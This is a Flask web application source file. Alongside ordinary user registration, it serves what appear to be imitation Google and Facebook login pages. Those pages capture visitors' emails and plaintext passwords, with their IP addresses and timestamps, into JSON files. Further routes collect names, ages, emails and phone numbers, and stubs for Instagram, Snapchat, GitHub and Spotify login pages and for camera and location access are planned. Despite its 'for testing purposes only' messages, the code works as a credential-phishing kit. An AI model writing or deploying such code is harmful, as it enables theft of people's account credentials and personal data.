from flask import Flask, render_template, request, redirect, url_for
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key'

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

USER_DATA_FILE = 'data/users.json'

class User(UserMixin):
    def __init__(self, id, name, password):
        self.id = id
        self.name = name
        self.password = password

@login_manager.user_loader
def load_user(user_id):
    users = load_users()
    user_data = users.get(user_id)
    if user_data:
        return User(id=user_id, name=user_data['name'], password=user_data['password'])
    return None

def load_users():
    if not os.path.exists(USER_DATA_FILE):
        return {}
    with open(USER_DATA_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    os.makedirs(os.path.dirname(USER_DATA_FILE), exist_ok=True)
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(users, f, indent=4)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        name = request.form['name']
        password = request.form['password']

        users = load_users()
        for uid, user in users.items():
            if user['name'] == name:
                return 'User already exists'

        user_id = str(len(users) + 1)
        users[user_id] = {
            'name': name,
            'password': generate_password_hash(password)
        }
        save_users(users)
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        name = request.form['username']
        password = request.form['password']
        users = load_users()
        for uid, user in users.items():
            if user['name'] == name and check_password_hash(user['password'], password):
                login_user(User(id=uid, name=name, password=user['password']))
                return redirect(url_for('dashboard'))
        return 'Invalid credentials'
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', name=current_user.name)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/personal', methods=['GET', 'POST'])
def personal():
    if request.method == 'POST':
        name = request.form['name']
        age = request.form['age']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            "timestamp": timestamp,
            "ip": ip,
            "name": name,
            "age": age
        }

        save_to_json('data/personal_data.json', data)
        return 'Personal info saved successfully!'
    return render_template('forms/personal.html')

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        email = request.form['email']
        phone = request.form['phone']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            "timestamp": timestamp,
            "ip": ip,
            "email": email,
            "phone": phone
        }

        save_to_json('data/contact_data.json', data)
        return 'Contact info saved successfully!'
    return render_template('forms/contact.html')
    
@app.route('/google-login', methods=['GET', 'POST'])
def google_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            'email': email,
            'password': password,
            'ip': ip,
            'timestamp': timestamp
        }

        save_to_json('data/google_data.json', data)

        return "Login data saved (for testing purposes only)."
    
    return render_template('idp/google.html')

@app.route('/facebook-login', methods=['GET', 'POST'])
def facebook_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']
        ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        data = {
            'email': email,
            'password': password,
            'ip': ip,
            'timestamp': timestamp
        }

        save_to_json('data/facebook_data.json', data)

        return "Facebook login data saved (for testing purposes only)."

    return render_template('idp/facebook.html')

@app.route('/login-options')
@login_required
def login_options():
    return render_template('/options/login_options.html')

@app.route('/camera')
@login_required
def camera():
    return "Camera Access Page (To be developed)"


@app.route('/location')
@login_required
def location():
    return "Location Access Page (To be developed)"

@app.route('/other-options')
@login_required
def other_options():
    return "Other Options Page (To be developed)"

def instagram_login():
    return "Instagram login page (testing purpose)."


@app.route('/snapchat-login', methods=['GET', 'POST'])
def snapchat_login():
    return "Snapchat login page (testing purpose)."

@app.route('/github-login', methods=['GET', 'POST'])
def github_login():
    return "GitHub login page (testing purpose)."

@app.route('/spotify-login', methods=['GET', 'POST'])
def spotify_login():
    return "Spotify login page (testing purpose)."

def save_to_json(filename, data):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            existing_data = json.load(f)
    else:
        existing_data = []

    existing_data.append(data)

    with open(filename, 'w') as f:
        json.dump(existing_data, f, indent=4)

if __name__ == '__main__':
    app.run(debug=True)
